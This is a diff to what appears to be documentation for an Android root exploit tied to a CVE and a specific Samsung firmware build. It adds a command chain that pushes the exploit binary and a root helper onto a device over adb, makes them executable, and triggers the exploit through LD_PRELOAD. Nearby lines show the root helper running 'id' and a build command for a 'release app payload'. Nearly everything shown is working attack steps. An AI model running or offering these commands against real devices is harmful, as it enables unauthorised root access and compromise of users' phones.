@@ -61,6 +61,10 @@ adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
 The release app payload is built with:
 
 ```sh
+adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499 && adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root && adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root && adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
+```
+
+```sh
 make TARGET=essi-S721NKSSCDZF3 ANDROID_NDK_HOME=/path/to/android-ndk release
 ```
 
